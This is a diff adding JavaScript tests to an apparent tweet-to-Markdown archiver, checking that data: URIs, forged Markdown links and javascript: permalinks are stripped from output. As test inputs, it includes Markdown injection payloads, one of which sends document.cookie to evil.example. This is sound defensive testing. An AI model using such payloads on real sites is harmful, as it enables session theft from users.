@@ -98,3 +98,57 @@ test("a post whose author block vanished is still captured, with a warning", () 
   assert.match(out.markdown, /An orphaned post\./);
   assert.ok(out.warnings.some((w) => /author/i.test(w)));
 });
+
+test("a data: image URI is never inlined into readable.md", () => {
+  // The bytes belong in page.mhtml. A base64 blob in readable.md is both
+  // useless to a reader and a way to smuggle content past the renderer.
+  const html = `<html><body>
+    <article data-testid="tweet" role="article">
+      <div data-testid="User-Name"><a href="/adarenn">Ada Renn</a><a href="/adarenn">@adarenn</a>
+        <time datetime="2024-03-02T09:30:00.000Z">2h</time></div>
+      <div data-testid="tweetText"><span>Look at this.</span></div>
+      <div data-testid="tweetPhoto">
+        <img alt="A chart" src="data:image/svg+xml;base64,${"QUJD".repeat(300)}">
+      </div>
+    </article></body></html>`;
+  const out = run(STATUS, html);
+
+  assert.doesNotMatch(out.markdown, /base64/i, "no inlined bytes");
+  assert.doesNotMatch(out.markdown, /data:image/i);
+  assert.match(out.markdown, /!\[A chart\]/, "the alt text still says what was there");
+});
+
+test("markdown syntax in an alt text or a display name cannot forge a link", () => {
+  // Every part of a post is attacker-controlled: alt text, display name,
+  // handle and the src itself. None of them may become Markdown syntax.
+  const html = `<html><body>
+    <article data-testid="tweet" role="article">
+      <div data-testid="User-Name">
+        <a href="/x">Ada](javascript:alert(1)) Renn</a>
+        <a href="/x">@adarenn</a>
+        <time datetime="2024-03-02T09:30:00.000Z">2h</time>
+      </div>
+      <div data-testid="tweetText"><span>Hello.</span></div>
+      <div data-testid="tweetPhoto">
+        <img alt="![](https://evil.example) [pwn](javascript:fetch('//evil.example/'+document.cookie))"
+             src="https://pbs.twimg.com/media/ok.jpg">
+      </div>
+    </article></body></html>`;
+  const out = run(STATUS, html);
+
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i, "no javascript: target survives");
+  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(https:\/\/evil\.example\)/, "no second image is forged out of the alt");
+  assert.match(out.markdown, /https:\/\/pbs\.twimg\.com\/media\/ok\.jpg/, "the real image is still there");
+});
+
+test("a javascript: permalink is dropped rather than recorded", () => {
+  const html = `<html><body>
+    <article data-testid="tweet" role="article">
+      <div data-testid="User-Name"><a href="/adarenn">@adarenn</a>
+        <a href="javascript:void(0)/status/1764000000000000009">link</a>
+        <time datetime="2024-03-02T09:30:00.000Z">2h</time></div>
+      <div data-testid="tweetText"><span>Body.</span></div>
+    </article></body></html>`;
+  const out = run(STATUS, html);
+  assert.doesNotMatch(out.markdown, /javascript:/i);
+});
